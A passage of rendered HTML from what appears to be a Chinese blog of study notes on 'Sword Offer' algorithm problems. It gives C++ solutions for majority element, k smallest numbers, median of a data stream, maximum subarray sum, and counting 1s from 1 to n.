aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 的时间和额外 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span> 的空间，该怎么做呢？</li></ul><p><strong>数据范围</strong></p><p>数组长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：[1,2,1,1,3]输出：1</code></pre><h3 id="题解-5">题解</h3><p>排序可以解决该问题: 中间的数一定是目标数, 但时间复杂度过高<br>本题思路:<br>初始化cnt = 0, val 为一不存在nums中的数<br>val = target使得对应于target的cnt++<br>val != target使得对应于target的cnt-- (对应非target的cnt++, 等价对应于target的cnt–)<br>由于target数量大于总数的一半, 最后剩下的val = target</p><blockquote><p>吐槽一句：代码是按照google style c++写出来的，本题的代码有点丑呀🥵！</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">  int moreThanHalfNum_Solution(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">    int val = -1, cnt = 0;</span><br><span class="line">    for (auto x: nums) &#123;</span><br><span class="line">      if (x == val) &#123;</span><br><span class="line">        cnt++;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        if (cnt) &#123;</span><br><span class="line">          cnt--;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">          val = x;</span><br><span class="line">          cnt = 1;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="最小的k个数"><a href="https://www.acwing.com/problem/content/49/">最小的k个数</a></h2><p>输入 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个整数，找出其中最小的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 个数。</p><p><strong>注意：</strong></p><ul><li>输出数组内元素请按从小到大顺序排序;</li></ul><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>k</mi><mo>≤</mo><mi>n</mi><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">1 \le k \le n \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>样例</strong></p><pre><code>输入：[1,2,3,4,5,6,7,8] , k=4输出：[1,2,3,4]</code></pre><h3 id="法1-堆排序">法1. 堆排序</h3><p>时间复杂度: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>⋅</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>k</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n\cdot logk)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span></span>, 每次插入的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>k</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(logk)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span></span><br>维护一个大小为k的大根堆，将数组元素都push进堆，当堆中的数大于k时弹出堆顶元素。注意弹出堆顶的顺序是从大到小的k个数，要进行逆序操作。</p><blockquote><p><strong>大根堆</strong> 可以通过查看堆头<code>heap.top()</code>，快速知道堆中的最大元素。<br><strong>小根堆</strong> 的声明为 <code>priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt;</code><br><strong>heap</strong> 加入元素的函数为 <code>push()</code></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">getLeastNumbers_Solution</span><span class="params">(vector&lt;<span class="type">int</span>&gt; input, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">    <span class="comment">// if (!k) return res;  // 如果k=0没有这句的话，当heap为空访问heap.top()时报seg fault </span></span><br><span class="line">    priority_queue&lt;<span class="type">int</span>&gt; heap;  <span class="comment">// 大根堆</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: input) &#123;</span><br><span class="line">      <span class="keyword">if</span> (heap.<span class="built_in">size</span>() &lt; k || heap.<span class="built_in">top</span>() &gt; x) heap.<span class="built_in">push</span>(x);</span><br><span class="line">      <span class="keyword">if</span> (heap.<span class="built_in">size</span>() &gt; k) heap.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (heap.<span class="built_in">size</span>()) &#123;</span><br><span class="line">      res.<span class="built_in">push_back</span>(heap.<span class="built_in">top</span>());</span><br><span class="line">      heap.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">reverse</span>(res.<span class="built_in">begin</span>(), res.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="法2-k次快选">法2: k次快选</h3><p>时间复杂度: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>⋅</mo><mi>l</mi><mi>o</mi><mi>g</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">k\cdot log(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; input_;</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">getLeastNumbers_Solution</span><span class="params">(vector&lt;<span class="type">int</span>&gt; input, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    input_ = input;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= k; i++) &#123;</span><br><span class="line">      res.<span class="built_in">push_back</span>(<span class="built_in">quick_choose</span>(<span class="number">0</span>, input_.<span class="built_in">size</span>() - <span class="number">1</span>, i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">quick_choose</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span> input_[l];</span><br><span class="line">    <span class="type">int</span> i = l - <span class="number">1</span>, j = r + <span class="number">1</span>, x = input_[(i + r) &gt;&gt; <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">      <span class="keyword">while</span> (input_[++i] &lt; x) &#123;&#125;;</span><br><span class="line">      <span class="keyword">while</span> (input_[--j] &gt; x) &#123;&#125;;</span><br><span class="line">      <span class="keyword">if</span> (i &lt; j) <span class="built_in">swap</span>(input_[i], input_[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (k &lt;= j - l + <span class="number">1</span>) <span class="keyword">return</span> <span class="built_in">quick_choose</span>(l, j, k);  <span class="comment">// 必须是&lt;=</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">quick_choose</span>(j + <span class="number">1</span>, r, k - (j - l + <span class="number">1</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="数据流中的中位数★"><a href="https://www.acwing.com/problem/content/88/">数据流中的中位数★</a></h2><p>如何得到一个数据流中的中位数？</p><p>如果从数据流中读出奇数个数值，那么中位数就是所有数值排序之后位于中间的数值。</p><p>如果从数据流中读出偶数个数值，那么中位数就是所有数值排序之后中间两个数的平均值。</p><p><strong>数据范围</strong></p><p>数据流中读入的数据总数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：1, 2, 3, 4输出：1,1.5,2,2.5解释：每当数据流读入一个数据，就进行一次判断并输出当前的中位数。</code></pre><h3 id="题解-用一个小根堆min-heap维护较大的数-用一个大根堆max-heap维护较小的数">题解 用一个小根堆min_heap维护较大的数, 用一个大根堆max_heap维护较小的数</h3><p>那么中位数就可以用大小根堆的根节点进行表示</p><p>insert()插入一个新值时:</p><ol><li>先放入大根堆max_heap中</li><li>如果max_heap的根 &gt; min_heap的根, 则进行交换</li><li>如果max_heap的数量比min_heap数量大1以上, 则将max_heap的队头放入min_heap中</li></ol><p><img src="/2022/11/16/%E7%AE%97%E6%B3%95-%E3%80%8A%E5%89%91%E6%8C%87offer%E3%80%8B%E7%AC%94%E8%AE%B0/image-20221219175158742.png" alt></p><blockquote><p>返回的是double, 切勿用移位来求平均，而是应当用<code>/ 2.0</code></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, greater&lt;<span class="type">int</span>&gt;&gt; min_heap;  <span class="comment">// 小根堆</span></span><br><span class="line">  priority_queue&lt;<span class="type">int</span>&gt; max_heap;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> num)</span></span>&#123;</span><br><span class="line">    max_heap.<span class="built_in">push</span>(num);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (min_heap.<span class="built_in">size</span>() &amp;&amp; max_heap.<span class="built_in">top</span>() &gt; min_heap.<span class="built_in">top</span>()) &#123;</span><br><span class="line">      <span class="keyword">auto</span> maxv = max_heap.<span class="built_in">top</span>(), minv = min_heap.<span class="built_in">top</span>();</span><br><span class="line">      max_heap.<span class="built_in">pop</span>(), min_heap.<span class="built_in">pop</span>();</span><br><span class="line">      min_heap.<span class="built_in">push</span>(maxv), max_heap.<span class="built_in">push</span>(minv);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (max_heap.<span class="built_in">size</span>() - min_heap.<span class="built_in">size</span>() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">      min_heap.<span class="built_in">push</span>(max_heap.<span class="built_in">top</span>());</span><br><span class="line">      max_heap.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">double</span> <span class="title">getMedian</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (max_heap.<span class="built_in">size</span>() &gt; min_heap.<span class="built_in">size</span>()) <span class="keyword">return</span> max_heap.<span class="built_in">top</span>();</span><br><span class="line">    <span class="keyword">return</span> (max_heap.<span class="built_in">top</span>() + min_heap.<span class="built_in">top</span>()) / <span class="number">2.0</span>;  <span class="comment">// 返回的是double, 必用2.0, 切勿用移位</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="连续子数组的最大和"><a href="https://www.acwing.com/problem/content/50/">连续子数组的最大和</a></h2><p>输入一个 <strong>非空</strong> 整型数组，数组里的数可能为正，也可能为负。</p><p>数组中一个或连续的多个整数组成一个子数组。</p><p>求所有子数组的和的最大值。</p><p>要求时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p><p><strong>数据范围</strong></p><p>数组长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>。<br>数组内元素取值范围 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><mn>200</mn><mo separator="true">,</mo><mn>200</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[-200,200]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord">200</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">200</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：[1, -2, 3, 10, -4, 7, 2, -5]输出：18</code></pre><h3 id="DP">DP</h3><p>使用s记录紧邻x的前面的连续数组最大和, 那么到x时:</p><ol><li>如果s大于等于0, 以x结尾的连续数组最大和为 x + s;</li><li>如果s小于0, 以x结尾的连续数组最大和为x (前面是负数, 就没必要加上了);</li></ol><blockquote><p>可以使用<code>INT_MIN</code> 和 <code>INT_MAX</code>之类的。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">maxSubArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> res = INT_MIN, s = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: nums) &#123;</span><br><span class="line">      <span class="keyword">if</span> (s &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        s = s + x;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        s = x;</span><br><span class="line">      &#125;</span><br><span class="line">      res = <span class="built_in">max</span>(res, s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="从1到n整数中1出现的次数★"><a href="https://www.acwing.com/problem/content/51/">从1到n整数中1出现的次数★</a></h2><p>输入一个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>，求从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 这 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个整数的十进制表示中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 出现的次数。</p><p>例如输入 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>12</mn></mrow><annotation encoding="application/x-tex">12</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">12</span></span></span></span>，从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>12</mn></mrow><annotation encoding="application/x-tex">12</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">12</span></span></span></span> 这些整数中包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>“</mtext><mn>1</mn><mtext>”</mtext></mrow><annotation encoding="application/x-tex">“1”</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">“1”</span></span></span></span> 的数字有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mtext>，</mtext><mn>10</mn><mtext>，</mtext><mn>11</mn></mrow><annotation encoding="application/x-tex">1，10，11</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">1</span><span class="mord cjk_fallback">，</span><span class="mord">10</span><span class="mord cjk_fallback">，</span><span class="mord">11</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>12</mn></mrow><annotation encoding="application/x-tex">12</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">12</span></span></span></span>，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>“</mtext><mn>1</mn><mtext>”</mtext></mrow><annotation encoding="application/x-tex">“1”</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">“1”</span></span></span></span> 一共出现了 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span> 次。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">1 \le n \le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>样例</strong></p><pre><code>输入： 12输出： 5</code></pre><h3 id="题解-6">题解</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">numberOf1Between1AndN_Solution</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>, dgt = <span class="built_in">GetDigit</span>(n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = dgt - <span class="number">1</span>; ~j; j--) &#123;</span><br><span class="line">      <span class="type">int</span> p = <span class="built_in">pow</span>(<span class="number">10</span>, j);</span><br><span class="line">      <span class="comment">// 不能在此函数中通过 vector&lt;int&gt; nums的size()求dgt: 求nums过程中n会被归0</span></span><br><span class="line">      <span class="type">int</span> left = n / p / <span class="number">10</span>, right = n % p, dj = n / p % <span class="number">10</span>;</span><br><span class="line">      res += left * p;</span><br><span class="line">      <span class="keyword">if</span> (dj &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        res += p;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dj == <span class="number">1</span>) &#123;</span><br><span class="line">        res += right + <span class="number">1</span>;</span><br><span 